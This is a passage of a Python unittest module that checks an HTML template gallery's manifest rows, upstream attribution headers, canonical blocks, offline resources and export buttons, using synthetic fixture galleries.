        path = _port_path(gallery_root, artifact_id)
        if path.is_file():
            documents.append((artifact_id, path, _document_text(path)))
    return documents


def _read_only_fill_region(text: str, slot: str) -> str:
    block = f"FILL:{slot}"
    return _region(text, block) if _embeds(text, block) else ""


def _element_has_class(element: _Element, class_name: str) -> bool:
    return any(class_name in value.split() for value in _attribute_values(element, "class"))


def _element_ids(elements: list[_Element], *, tag: str | None = None) -> set[str]:
    return {value for element in elements if tag is None or element.tag == tag
            for value in _attribute_values(element, "id")}


def _missing_concepts(visible_text: str, concepts: tuple[tuple[str, tuple[str, ...]], ...]) -> list[str]:
    return [name for name, terms in concepts if not all(term.casefold() in visible_text for term in terms)]


def _missing_ordered_phases(markup: str) -> list[str]:
    missing: list[str] = []
    cursor = 0
    for name, time in ANIMATION_KEYFRAME_PHASES:
        for token in (name, time):
            position = markup.find(token, cursor)
            if position < 0:
                missing.append(f"{name} {time}")
                break
            cursor = position + len(token)
    return missing


def _canonical_optional_typeface_references(gallery_root: Path) -> frozenset[str]:
    """Canonical font references after the same HTML normalization as artifacts."""
    canonical_head = _canonical_region(gallery_root, HEAD_BLOCK) or ""
    label = f"{CANONICAL_FILES[HEAD_BLOCK]}: canonical {HEAD_BLOCK} region"
    references, _ = _element_references(label, _elements(canonical_head))
    typefaces: set[str] = set()
    for reference in references:
        parsed = _parsed(reference.value)
        host = (parsed.hostname or "").casefold() if parsed is not None else ""
        if reference.kind == RESOURCE and host in ALLOWED_HOSTS:
            typefaces.add(reference.value)
    return frozenset(typefaces)


def _status_only_port_failures(
    gallery_root: Path,
    baselines: dict[str, dict[str, object]],
    port_kind: str,
) -> list[str]:
    entries = _entries(gallery_root)
    if entries is None:
        return [f"{MANIFEST_FILE}: {port_kind} port rows cannot be checked"]

    failures: list[str] = []
    for artifact_id, baseline in baselines.items():
        matches = [entry for entry in entries if isinstance(entry, dict) and entry.get("id") == artifact_id]
        if len(matches) != 1:
            failures.append(
                f"{MANIFEST_FILE}: {port_kind} port '{artifact_id}' appears {len(matches)} times rather than once"
            )
            continue
        entry = matches[0]
        for field, expected in baseline.items():
            if field != "status" and entry.get(field) != expected:
                failures.append(
                    f"{MANIFEST_FILE}: {port_kind} port '{artifact_id}': field '{field}' drifted from "
                    f"the pinned baseline at {UPSTREAM_REPOSITORY}@{PINNED_UPSTREAM_COMMIT}"
                )
        if set(entry) != set(baseline):
            failures.append(f"{MANIFEST_FILE}: {port_kind} port '{artifact_id}': keys changed from the pinned baseline")
        if entry.get("status") != SHIPPED:
            failures.append(
                f"{MANIFEST_FILE}: {port_kind} port '{artifact_id}': status must be '{SHIPPED}' after the "
                f"only permitted transition, found {entry.get('status')!r}"
            )
    return failures


def _attribution_and_canonical_failures(
    gallery_root: Path,
    baselines: dict[str, dict[str, object]],
) -> list[str]:
    failures: list[str] = []
    canonical = {block: _canonical_region(gallery_root, block) for block in CANONICAL_FILES}
    for artifact_id, _path, text in _port_texts(gallery_root, baselines):
        label = _artifact_label(artifact_id)
        source = baselines[artifact_id].get("source")
        source_file = source.get("file") if isinstance(source, dict) else None
        header = _attribution_header(text)
        if header is None:
            failures.append(f"{label}: exact upstream attribution header is missing")
        else:
            expected_values = {
                REPOSITORY_LABEL: UPSTREAM_REPOSITORY,
                UPSTREAM_FILE_LABEL: source_file,
                LICENSE_LABEL: UPSTREAM_LICENSE_ID,
                LICENSE_TEXT_LABEL: UPSTREAM_LICENSE_REFERENCE,
                DERIVATIVE_LABEL: PORT_DERIVATIVE_NOTICE,
            }
            for attribution_label, expected in expected_values.items():
                if header.count(attribution_label) != 1 or _labelled_value(header, attribution_label) != expected:
                    failures.append(
                        f"{label}: attribution field '{attribution_label}' does not equal {expected!r}"
                    )
            if header.count(UPSTREAM_COPYRIGHT) != 1:
                failures.append(f"{label}: attribution header does not carry the exact upstream copyright")

        for block, expected_region in canonical.items():
            if not _embeds(text, block):
                failures.append(f"{label}: canonical block {block} is missing or malformed")
            elif expected_region is None or _region(text, block) != expected_region:
                failures.append(f"{label}: canonical block {block} differs from its source region")
    return failures


def _offline_port_failures(
    gallery_root: Path,
    baselines: dict[str, dict[str, object]],
    port_kind: str,
) -> list[str]:
    labels = {_artifact_label(artifact_id) for artifact_id in baselines}
    canonical_typefaces = _canonical_optional_typeface_references(gallery_root)
    references, unrecognized = _references(gallery_root)
    failures = [failure for failure in unrecognized if failure.split(":", 1)[0] in labels]
    for reference in references:
        if reference.label not in labels or reference.kind != RESOURCE:
            continue
        if (
            _embedded_asset(reference.value)
            or reference.value.startswith("#")
            or reference.value in canonical_typefaces
        ):
            continue
        failures.append(
            _named(reference, f"requires a sibling or network resource, so the {port_kind} port is not offline")
        )
    return failures


def check_m1(gallery_root: Path) -> list[str]:
    """M1 — read-only rows retain their exact baseline and flip only status."""
    return _status_only_port_failures(gallery_root, READ_ONLY_PORT_MANIFEST_BASELINE, "read-only")


def check_m2(gallery_root: Path) -> list[str]:
    """M2 — every declared read-only port has its directly openable file."""
    return [
        f"{_artifact_label(artifact_id)}: read-only port file is missing"
        for artifact_id in READ_ONLY_PORT_MANIFEST_BASELINE
        if not _port_path(gallery_root, artifact_id).is_file()
    ]


def check_m3(gallery_root: Path) -> list[str]:
    """M3 — each read-only file carries exact attribution and canonical blocks."""
    return _attribution_and_canonical_failures(gallery_root, READ_ONLY_PORT_MANIFEST_BASELINE)


def check_m4(gallery_root: Path) -> list[str]:
    """M4 — read-only ports expose no export-looking control, even disabled."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, READ_ONLY_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        for order, control in enumerate(_interactive_controls(text), start=1):
            attributes = control["attributes"]
            nested_text = control["text"]
            if not isinstance(attributes, tuple) or not isinstance(nested_text, list):
                continue
            evidence = " ".join(
                [*(f"{name} {value}" for name, value in attributes), *(str(value) for value in nested_text)]
            )
            carries_download = any(name == "download" for name, _ in attributes)
            if carries_download or _EXPORT_AFFORDANCE_RE.search(evidence):
                failures.append(
                    f"{label}: interactive element source-order {order}: read-only port exposes an "
                    "export-looking control"
                )
    return failures


GROUP_Q_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (("Q1", check_q1),)


class SlideDeckReaderTests(unittest.TestCase):
    def test_slide_deck_reader_contract_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_Q_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_horizontal_scroll_rule_can_bind_an_id_selected_element(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            gallery = Path(raw) / "artifact-gallery"
            shutil.copytree(GALLERY_ROOT, gallery)
            artifact = gallery / TEMPLATES_DIR / f"{SLIDE_DECK_ID}.html"
            text = artifact.read_text()
            text = text.replace(
                "</head>",
                '<style>#review-scroll-region { overflow-x: auto; }</style>\n</head>',
                1,
            )
            text = text.replace(
                "</body>",
                '<section id="review-scroll-region" tabindex="0" role="group" '
                'aria-label="Slide comparison strip"></section>\n</body>',
                1,
            )
            artifact.write_text(text)

            self.assertEqual(check_q1(gallery), [])


def check_m5(gallery_root: Path) -> list[str]:
    """M5 — read-only ports require no sibling or network resource offline."""
    return _offline_port_failures(gallery_root, READ_ONLY_PORT_MANIFEST_BASELINE, "read-only")


def check_m6(gallery_root: Path) -> list[str]:
    """M6 — pinned read-only concepts survive only the approved compactions."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, READ_ONLY_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        elements = _elements(text)
        issues: list[str] = []

        if artifact_id == "design-system":
            section_ids = _element_ids(elements, tag="section")
            missing = [section_id for section_id in DESIGN_SYSTEM_SECTION_IDS if section_id not in section_ids]
            if missing:
                issues.append("section concepts " + ", ".join(f"#{section_id}" for section_id in missing))

        elif artifact_id == "animation-prototype":
            if "task" not in _element_ids(elements):
                issues.append("completion selector #task")

            easing_controls = [
                element
                for element in elements
                if element.tag == "button" and _element_has_class(element, "ease-btn")
            ]
            easing_values = tuple(
                values[0]
                for element in easing_controls
                if len(values := _attribute_values(element, "data-ease")) == 1
            )
            if easing_values != ANIMATION_EASING_CHOICES:
                issues.append("all three .ease-btn[data-ease] choices in source order")
            if sum(_element_has_class(element, "active") for element in easing_controls) != 1:
                issues.append("exactly one .ease-btn.active state")

            missing_phases = _missing_ordered_phases(_read_only_fill_region(text, "keyframes"))
            if missing_phases:
                issues.append("ordered keyframe phases " + ", ".join(missing_phases))

            snippet_markup = _read_only_fill_region(text, "css-snippet")
            snippet_elements = _elements(snippet_markup)
            if not any(element.tag == "pre" for element in snippet_elements):
                issues.append("visible preformatted CSS snippet")
            missing_snippet_selectors = [token for token in (".task.done", "--ease") if token not in snippet_markup]
            if missing_snippet_selectors:
                issues.append("snippet selectors " + ", ".join(missing_snippet_selectors))
            snippet_ids = _element_ids(snippet_elements)
            missing_snippet_ids = [
                identifier
                for identifier in ("snippet-easing-name", "snippet-easing-value")
                if identifier not in snippet_ids
            ]
            if missing_snippet_ids:
                issues.append("live easing snippet selectors " + ", ".join(f"#{value}" for value in missing_snippet_ids))
            script_text = "\n".join(_script_bodies(text))
            missing_easing_bindings = [
                token
                for token in (
                    "snippetEasingName.textContent = selected.getAttribute('data-name')",
                    "snippetEasingValue.textContent = selected.getAttribute('data-ease')",
                )
                if token not in script_text
            ]
            if missing_easing_bindings:
                issues.append("live easing snippet bindings " + ", ".join(missing_easing_bindings))

        elif artifact_id == "interaction-prototype":
            ids = _element_ids(elements)
            missing_ids = [element_id for element_id in ("list", "indicator", "reset-order") if element_id not in ids]
            if missing_ids:
                issues.append("interaction selectors " + ", ".join(f"#{element_id}" for element_id in missing_ids))

            retained_views = [
                element
                for element in elements
                if element.tag == "li"
                and _element_has_class(element, "item")
                and _attribute_values(element, "draggable") == ["true"]
                and any(value.startswith("views-") for value in _attribute_values(element, "id"))
            ]
            if len(retained_views) < INTERACTION_MINIMUM_RETAINED_VIEWS:
                issues.append(
                    f"at least {INTERACTION_MINIMUM_RETAINED_VIEWS} .item[draggable=\"true\"] view anchors "
                    f"(found {len(retained_views)})"
                )

            missing_behavior = [token for token in INTERACTION_BEHAVIOR_TOKENS if token not in text]
            if missing_behavior:
                issues.append("reorder/indicator/reset tokens " + ", ".join(missing_behavior))

            notes = _read_only_fill_region(text, "interaction-notes").casefold()
            missing_notes = _missing_concepts(notes, INTERACTION_NOTE_CONCEPTS)
            if missing_notes:
                issues.append("interaction notes " + ", ".join(missing_notes))

            questions = _read_only_fill_region(text, "open-questions").casefold()
            missing_questions = _missing_concepts(questions, INTERACTION_QUESTION_CONCEPTS)
            if missing_questions:
                issues.append("open questions " + ", ".join(missing_questions))

        elif artifact_id == "svg-illustrations":
            illustration_markup = _read_only_fill_region(text, "illustrations")
            illustration_elements = _elements(illustration_markup)
            svg_ids = _element_ids(illustration_elements, tag="svg")
            missing_ids = [svg_id for svg_id in SVG_ILLUSTRATION_IDS if svg_id not in svg_ids]
            if missing_ids:
                issues.append("SVG selectors " + ", ".join(f"#{svg_id}" for svg_id in missing_ids))
            caption_count = sum(element.tag == "figcaption" for element in illustration_elements)
            if caption_count < len(SVG_ILLUSTRATION_IDS):
                issues.append(f"three illustration captions (found {caption_count})")

            palette = _read_only_fill_region(text, "palette-rules").casefold()
            missing_palette = _missing_concepts(palette, SVG_PALETTE_CONCEPTS)
            if missing_palette:
                issues.append("palette meaning " + ", ".join(missing_palette))

            has_download_attribute = any(
                name == "download" for element in elements for name, _value in element.attributes
            )
            has_download_script = re.search(
                r"(?i)\burl\s*\.\s*createobjecturl\s*\(|\.download\b",
                "\n".join(_script_bodies(text)),
            )
            if has_download_attribute or has_download_script:
                issues.append("download implementation")

        if issues:
            failures.append(f"{label}: pinned source inventory or compaction boundary failed: {'; '.join(issues)}")

    return failures


GROUP_M_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("M1", check_m1),
    ("M2", check_m2),
    ("M3", check_m3),
    ("M4", check_m4),
    ("M5", check_m5),
    ("M6", check_m6),
)


class ReadOnlyPortContractTests(unittest.TestCase):
    """Group M against the four manifest-declared read-only ports."""

    def test_group_m_passes_against_the_gallery(self) -> None:
        self.maxDiff = None
        for name, check in GROUP_M_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


class _PortContractFixtureCase(GalleryFixtureCase):
    """Shared exact-baseline, attribution, and canonical fixture setup."""

    PORT_BASELINES: dict[str, dict[str, object]] = {}

    def manifest(self) -> dict:
        entries = json.loads(json.dumps(list(self.PORT_BASELINES.values())))
        for entry in entries:
            entry["status"] = SHIPPED
        return {"templates": entries}

    def attribution_header(self, artifact_id: str, *, upstream_file: str | None = None) -> str:
        source = self.PORT_BASELINES[artifact_id]["source"]
        declared_file = source["file"] if isinstance(source, dict) else ""
        return (
            "<!--\n"
            f"  {REPOSITORY_LABEL} {UPSTREAM_REPOSITORY}\n"
            f"  {UPSTREAM_FILE_LABEL} {upstream_file or declared_file}\n"
            f"  {LICENSE_LABEL} {UPSTREAM_LICENSE_ID}\n"
            f"  {LICENSE_TEXT_LABEL} {UPSTREAM_LICENSE_REFERENCE}\n"
            f"  {DERIVATIVE_LABEL} {PORT_DERIVATIVE_NOTICE}\n"
            f"  {UPSTREAM_COPYRIGHT}\n"
            "-->"
        )

    def write_canonical_files(self, *, head_body: str = FIXTURE_HEAD_BODY) -> None:
        self.write(CANONICAL_FILES[BRAND_BLOCK], _marked(BRAND_BLOCK, FIXTURE_BRAND_BODY))
        self.write(CANONICAL_FILES[HEAD_BLOCK], _marked(HEAD_BLOCK, head_body))


class ReadOnlyPortContractFixtureTests(_PortContractFixtureCase):
    """Group M against complete synthetic read-only ports."""

    PORT_BASELINES = READ_ONLY_PORT_MANIFEST_BASELINE

    def capability_body(self, artifact_id: str) -> str:
        bodies = {
            "design-system": "<main>" + "".join(
                f'<section id="{section_id}">{section_id}</section>'
                for section_id in DESIGN_SYSTEM_SECTION_IDS
            ) + "</main>",
            "animation-prototype": (
                '<main><button id="task" class="task" type="button">Task</button>'
                '<button class="ease-btn" data-ease="linear">Linear</button>'
                '<button class="ease-btn" data-ease="cubic-bezier(0.16, 1, 0.3, 1)">Ease-out</button>'
                '<button class="ease-btn active" data-ease="cubic-bezier(0.34, 1.56, 0.64, 1)">Spring</button>'
                '<!-- FILL:keyframes:START --><ol><li>Fill 0ms</li><li>Check 80ms</li>'
                '<li>Strike 120ms</li><li>Confetti 200ms</li><li>Collapse 600ms</li></ol>'
                '<!-- FILL:keyframes:END --><!-- FILL:css-snippet:START -->'
                '<pre>.task.done { transition: all 200ms var(--ease); }'
                '<span id="snippet-easing-name">Spring</span>'
                '<span id="snippet-easing-value">cubic-bezier(.34,1.56,.64,1)</span></pre>'
                '<!-- FILL:css-snippet:END -->'
                "<script>var snippetEasingName; var snippetEasingValue; function selectEasing(selected) {"
                "snippetEasingName.textContent = selected.getAttribute('data-name');"
                "snippetEasingValue.textContent = selected.getAttribute('data-ease');}</script></main>"
            ),
            "interaction-prototype": (
                "<main><style>.item.dragging {} .indicator.on {}</style>"
                '<ul id="list"><li class="item" id="views-a" draggable="true">A</li>'
                '<li class="item" id="views-b" draggable="true">B</li><li class="item" id="views-c" draggable="true">C</li>'
                '<li class="indicator" id="indicator">Insert here</li>'
                '</ul><button id="reset-order" type="button">Reset order</button>'
                '<!-- FILL:interaction-notes:START --><p>Drop indicator snaps to the nearest gap. Dragged row stays in place. '
                'Grip dots identify the whole row. No auto-scroll and no drop animation.</p><!-- FILL:interaction-notes:END -->'
                '<!-- FILL:open-questions:START --><p>Should Trash and Archive be pinned and excluded from reordering? '
                'Should rows slide or use an instant snap? Is the keyboard Alt plus Arrow path enough?</p><!-- FILL:open-questions:END -->'
                "<script>var initialOrder=[];list.addEventListener('dragstart',noop);list.addEventListener('dragover',noop);"
                "list.addEventListener('drop',noop);document.addEventListener('dragend',noop);"
                "item.classList.add('dragging'); item.classList.remove('dragging');"
                "indicator.classList.add('on'); indicator.classList.remove('on');"
                "reset.addEventListener('click',function(){list.insertBefore(item,indicator);});"
                "</script></main>"
            ),
            "svg-illustrations": (
                '<main><!-- FILL:illustrations:START -->'
                '<figure><svg id="ill-queue"></svg><figcaption>Queue</figcaption></figure>'
                '<figure><svg id="ill-retry"></svg><figcaption>Retry</figcaption></figure>'
                '<figure><svg id="ill-fanout"></svg><figcaption>Fanout</figcaption></figure>'
                '<!-- FILL:illustrations:END --><!-- FILL:palette-rules:START -->'
                '<p>Stroke and outline preserve emphasis without color. Labels write every state as text. '
                'Pattern distinguishes repeated states in monochrome.</p><!-- FILL:palette-rules:END --></main>'
            ),
        }
        return bodies[artifact_id]

    def write_read_only_artifact(
        self,
        artifact_id: str,
        *,
        body: str | None = None,
        upstream_file: str | None = None,
        include_brand: bool = True,
        include_head: bool = True,
        head_body: str = FIXTURE_HEAD_BODY,
    ) -> None:
        body = self.capability_body(artifact_id) if body is None else body
        brand = _marked(BRAND_BLOCK, FIXTURE_BRAND_BODY) if include_brand else ""
        head = _marked(HEAD_BLOCK, head_body) if include_head else ""
        self.write(
            f"{TEMPLATES_DIR}/{artifact_id}.html",
            "<!doctype html>\n"
            f"{self.attribution_header(artifact_id, upstream_file=upstream_file)}\n"
            "<html lang=\"en\">\n"
            f"<head><style>\n{brand}\n</style>\n{head}\n</head>\n"
            f"<body>{body}</body>\n"
            "</html>\n",
        )

    def write_conforming_gallery(
        self, *, omit: frozenset[str] = frozenset(), head_body: str = FIXTURE_HEAD_BODY
    ) -> None:
        self.write_canonical_files(head_body=head_body)
        self.write(MANIFEST_FILE, json.dumps(self.manifest(), indent=2))
        for artifact_id in READ_ONLY_PORT_MANIFEST_BASELINE:
            if artifact_id not in omit:
                self.write_read_only_artifact(artifact_id, head_body=head_body)

    def test_accepts_complete_read_only_ports(self) -> None:
        self.write_conforming_gallery()

        self.assertEqual([failure for _, check in GROUP_M_CHECKS for failure in check(self.gallery)], [])

    def test_accepts_entity_normalized_canonical_typeface_reference(self) -> None:
        canonical_head = (
            '<link rel="stylesheet" '
            'href="https://fonts.googleapis.com/css2?family=Geist&amp;display=swap">'
        )
        self.write_conforming_gallery(head_body=canonical_head)

        self.assertEqual(check_m5(self.gallery), [])

    def test_rejects_pinned_inventory_or_compaction_drift(self) -> None:
        cases = (
            ("design section", "design-system", 'id="components"', 'id="component-samples"', ("#components",)),
            (
                "easing choice",
                "animation-prototype",
                'data-ease="linear"',
                'data-timing="linear"',
                ("all three .ease-btn[data-ease]",),
            ),
            (
                "live easing snippet",
                "animation-prototype",
                'id="snippet-easing-value"',
                'id="stale-easing-value"',
                ("#snippet-easing-value",),
            ),
            (
                "retained views",
                "interaction-prototype",
                'id="views-c"',
                'id="compacted-c"',
                ("at least 3 .item", "found 2"),
            ),
            (
                "illustration selector",
                "svg-illustrations",
                'id="ill-fanout"',
                'id="ill-branch"',
                ("#ill-fanout",),
            ),
        )
        for name, artifact_id, old, new, fragments in cases:
            with self.subTest(msg=name):
                self.write_conforming_gallery()
                relative = f"{TEMPLATES_DIR}/{artifact_id}.html"
                text = _document_text(self.gallery / relative)
                self.assertEqual(text.count(old), 1, f"fixture mutation is not uniquely targeted: {old}")
                self.write(relative, text.replace(old, new, 1))
                self.assertReports(check_m6(self.gallery), *fragments)

    def test_rejects_a_read_only_row_that_has_not_shipped(self) -> None:
        self.write_conforming_gallery()
        manifest = self.manifest()
        manifest["templates"][0]["status"] = PLANNED
        self.write(MANIFEST_FILE, json.dumps(manifest, indent=2))

        self.assertReports(check_m1(self.gallery), "design-system", "status", PLANNED)

    def test_rejects_non_status_manifest_drift(self) -> None:
        self.write_conforming_gallery()
        manifest = self.manifest()
        manifest["templates"][0]["title"] = "Drifted title"
        self.write(MANIFEST_FILE, json.dumps(manifest, indent=2))

        self.assertReports(check_m1(self.gallery), "design-system", "title", "drifted")

    def test_rejects_a_missing_read_only_port_file(self) -> None:
        self.write_conforming_gallery(omit=frozenset({"svg-illustrations"}))

        self.assertReports(check_m2(self.gallery), "svg-illustrations.html", "missing")

    def test_rejects_attribution_for_a_different_pinned_source(self) -> None:
        self.write_conforming_gallery()
        self.write_read_only_artifact("animation-prototype", upstream_file="08-neighbour.html")

        self.assertReports(check_m3(self.gallery), "animation-prototype.html", UPSTREAM_FILE_LABEL)

    def test_rejects_a_missing_canonical_block(self) -> None:
        self.write_conforming_gallery()
        self.write_read_only_artifact("interaction-prototype", include_head=False)

        self.assertReports(check_m3(self.gallery), "interaction-prototype.html", HEAD_BLOCK)

    def test_rejects_a_disabled_export_looking_control(self) -> None:
        self.write_conforming_gallery()
        self.write_read_only_artifact(
            "svg-illustrations",
            body="<main><button type=\"button\" disabled>Download SVG</button></main>",
        )

        self.assertReports(check_m4(self.gallery), "svg-illustrations.html", "export-looking")

    def test_rejects_a_sibling_resource_required_offline(self) -> None:
        self.write_conforming_gallery()
        self.write_read_only_artifact(
            "design-system",
            body='<main><img src="tokens.png" alt="Token preview"></main>',
        )

        self.assertReports(check_m5(self.gallery), "design-system.html", "tokens.png", "offline")

    def test_rejects_a_noncanonical_network_resource(self) -> None:
        self.write_conforming_gallery()
        self.write_read_only_artifact(
            "design-system",
            body='<main><img src="https://fonts.gstatic.com/not-a-typeface.png" alt="Token preview"></main>',
        )

        self.assertReports(check_m5(self.gallery), "design-system.html", "fonts.gstatic.com", "offline")


# ---------------------------------------------------------------------------
# Group N — decision/export gallery ports
# ---------------------------------------------------------------------------

DECISION_PORT_MANIFEST_BASELINE: dict[str, dict[str, object]] = {
    "visual-designs": {
        "id": "visual-designs",
        "category": "exploration-planning",
        "title": "Visual Design Options",
        "when_to_use": (
            "Show several visual directions for the same screen so a reader can choose one. "
            "Reach for it before any of them is built."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "02-exploration-visual-designs.html"},
        "status": PLANNED,
        "exports": ["prompt", "markdown"],
    },
    "component-variants": {
        "id": "component-variants",
        "category": "design",
        "title": "Component Variants",
        "when_to_use": (
            "Render every state of one component on a single page: default, hover, focus, disabled, "
            "error, and loading. Reach for it when a state is easy to miss and expensive to get wrong."
        ),
        "stage": "ad-hoc",
        "trigger": {"always": True},
        "source": {"origin": UPSTREAM, "file": "06-component-variants.html"},
        "status": PLANNED,
        "exports": ["prompt", "markdown"],
    },
}
DECISION_EXPORT_CONTROL_LABELS: tuple[str, ...] = ("Copy as prompt", "Copy as Markdown")


def check_n1(gallery_root: Path) -> list[str]:
    """N1 — decision rows retain their exact baseline and flip only status."""
    return _status_only_port_failures(gallery_root, DECISION_PORT_MANIFEST_BASELINE, "decision")


def check_n2(gallery_root: Path) -> list[str]:
    """N2 — every declared decision port has its directly openable file."""
    return [
        f"{_artifact_label(artifact_id)}: decision port file is missing"
        for artifact_id in DECISION_PORT_MANIFEST_BASELINE
        if not _port_path(gallery_root, artifact_id).is_file()
    ]


def check_n3(gallery_root: Path) -> list[str]:
    """N3 — each decision file carries exact attribution and canonical blocks."""
    return _attribution_and_canonical_failures(gallery_root, DECISION_PORT_MANIFEST_BASELINE)


def check_n4(gallery_root: Path) -> list[str]:
    """N4 — both exact, enabled decision-export controls are visible once."""
    failures: list[str] = []
    for artifact_id, _path, text in _port_texts(gallery_root, DECISION_PORT_MANIFEST_BASELINE):
        label = _artifact_label(artifact_id)
        controls = _interactive_controls(text)
        for expected in DECISION_EXPORT_CONTROL_LABELS:
            matches: list[dict[str, object]] = []
            for control in controls:
                nested_text = control["text"]
                visible_text = (
                    " ".join(" ".join(str(value) for value in nested_text).split())
                    if isinstance(nested_text, list)
                    else ""
                )
                if visible_text == expected:
                    matches.append(control)
            if len(matches) != 1:
                failures.append(
                    f"{label}: visible export control {expected!r} appears {len(matches)} times rather than once"
                )
                continue
            attributes = matches[0]["attributes"]
            disabled = isinstance(attributes, tuple) and any(
                name == "disabled" or (name == "aria-disabled" and value.casefold() == "true")
                for name, value in attributes
            )
            if matches[0]["tag"] != "button" or disabled:
                failures.append(f"{label}: visible export control {expected!r} is not an enabled button")
    return failures


def check_n5(gallery_root: Path) -> list[str]:
    """N5 — decision ports require no sibling or network resource offline."""
    return _offline_port_failures(gallery_root, DECISION_PORT_MANIFEST_BASELINE, "decision")


GROUP_N_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("N1", check_n1),
    ("N2", check_n2),
    ("N3", check_n3),
    ("N4", check_n4),
    ("N5", check_n5),
)


class DecisionPortContractTests(unittest.TestCase):
    """Group N against the two manifest-declared decision ports."""

    def test_group_n_passes_against_the_gallery(self) -> None:
        self.maxDiff = None
        for name, check in GROUP_N_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


class DecisionPortContractFixtureTests(_PortContractFixtureCase):
    """Group N against complete synthetic decision ports."""

    PORT_BASELINES = DECISION_PORT_MANIFEST_BASELINE

    def export_controls(self) -> str:
        return "".join(f'<button type="button">{label}</button>' for label in DECISION_EXPORT_CONTROL_LABELS)

    def write_decision_artifact(
        self,
        artifact_id: str,
        *,
        body: str | None = None,
        upstream_file: str | None = None,
        include_brand: bool = True,
        include_head: bool = True,
    ) -> None:
        brand = _marked(BRAND_BLOCK, FIXTURE_BRAND_BODY) if include_brand else ""
        head = _marked(HEAD_BLOCK, FIXTURE_HEAD_BODY) if include_head else ""
        self.write(
            f"{TEMPLATES_DIR}/{artifact_id}.html",
            "<!doctype html>\n"
            f"{self.attribution_header(artifact_id, upstream_file=upstream_file)}\n"
            '<html lang="en"><head><style>\n'
            f'{brand}\n</style>\n{head}\n<meta name="viewport" content="width=device-width, initial-scale=1">\n</head>\n'
            f"<body><main>{self.export_controls() if body is None else body}</main></body></html>\n",
        )

    def write_conforming_gallery(self, *, omit: frozenset[str] = frozenset()) -> None:
        self.write_canonical_files()
        self.write(MANIFEST_FILE, json.dumps(self.manifest(), indent=2))
        for artifact_id in DECISION_PORT_MANIFEST_BASELINE:
            if artifact_id not in omit:
                self.write_decision_artifact(artifact_id)

    def test_accepts_complete_decision_ports(self) -> None:
        self.write_conforming_gallery()

        self.assertEqual([failure for _, check in GROUP_N_CHECKS for failure in check(self.gallery)], [])

    def test_rejects_a_decision_row_that_has_not_shipped(self) -> None:
        self.write_conforming_gallery()
        manifest = self.manifest()
        manifest["templates"][0]["status"] = PLANNED
        self.write(MANIFEST_FILE, json.dumps(manifest, indent=2))

        self.assertReports(check_n1(self.gallery), "visual-designs", "status", PLANNED)

    def test_rejects_non_status_decision_manifest_drift(self) -> None:
        self.write_conforming_gallery()
        manifest = self.manifest()
        manifest["templates"][1]["title"] = "Drifted title"
        self.write(MANIFEST_FILE, json.dumps(manifest, indent=2))

        self.assertReports(check_n1(self.gallery), "component-variants", "title", "drifted")

    def test_rejects_a_missing_decision_port_file(self) -> None:
        self.write_conforming_gallery(omit=frozenset({"component-variants"}))

        self.assertReports(check_n2(self.gallery), "component-variants.html", "missing")

    def test_rejects_attribution_for_a_different_decision_source(self) -> None:
        self.write_conforming_gallery()
        self.write_decision_artifact("visual-designs", upstream_file="03-neighbour.html")

        self.assertReports(check_n3(self.gallery), "visual-designs.html", UPSTREAM_FILE_LABEL)

    def test_rejects_a_missing_decision_canonical_block(self) -> None:
        self.write_conforming_gallery()
        self.write_decision_artifact("component-variants", include_head=False)

        self.assertReports(check_n3(self.gallery), "component-variants.html", HEAD_BLOCK)

    def test_rejects_a_missing_required_export_control(self) -> None:
        self.write_conforming_gallery()
        self.write_decision_artifact(
            "visual-designs",
            body='<button type="button">Copy as prompt</button>',
        )

        self.assertReports(check_n4(self.gallery), "visual-designs.html", "Copy as Markdown", "0 times")

    def test_rejects_a_decision_port_sibling_resource(self) -> None:
        self.write_conforming_gallery()
        self.write_decision_artifact(
            "component-variants",
            body=self.export_controls() + '<img src="preview.png" alt="Variant preview">',
        )

        self.assertReports(check_n5(self.gallery), "component-variants.html", "preview.png", "offline")


# ---------------------------------------------------------------------------
# Group O — decision export behavior contract
# ---------------------------------------------------------------------------

DECISION_EXPORT_CONTRACTS: dict[str, dict[str, object]] = {
    "visual-designs": {
        "radio_name": "chosen-direction",
        "slot": "Direction",
        "prompt_lead": (
            "Implement the visual direction named below and no other. "
            "The value in parentheses is the anchor of the direction it names."
        ),
        "markdown_lead": "Visual direction chosen while reviewing these options.",
        "choice_message": "Choose one visual direction before copying.",
        "context": ("Background:", "Direction note:"),
    },
    "component-variants": {
        "radio_name": "chosen-base-variant",
        "slot": "Base variant",
        "prompt_lead": (
            "Implement the base component variant named below and no other. "
            "The value in parentheses is the anchor of the variant it names."
        ),
        "markdown_lead": "Base component variant chosen while reviewing these states.",
        "choice_message": "Choose one base variant before copying.",
        "context": (
            "Variant note:",
            "States displayed: default, hover, focus, disabled, error, loading",
            "Padding:",
            "Border:",
            "Shadow:",
            "Snippet:",
        ),
    },
}
DECISION_BOTH_MISSING_MESSAGE = "Choose one option and enter a rationale before copying."
DECISION_RATIONALE_MISSING_MESSAGE = "Enter a rationale before copying."
DECISION_REFUSAL_MESSAGE = (
    "Copy failed. The text is in the field below. Select it and copy it by hand."
)


def _attrs(element: _Element) -> dict[str, str]:
    return dict(element.attributes)


def _id_matches(elements: list[_Element], identifier: str) -> list[_Element]:
    return [element for element in elements if _attrs(element).get("id") == identifier]


def _has_explicit_label(elements: list[_Element], identifier: str) -> bool:
    return any(
        element.tag == "label" and _attrs(element).get("for") == identifier
        for element in elements
    )


def check_o1(gallery_root: Path) -> list[str]:
    """O1 — persistent decisions and export feedback have stable semantics."""
    failures: list[str] = []
    for artifact_id, contract in DECISION_EXPORT_CONTRACTS.items():
        path = _port_path(gallery_root, artifact_id)
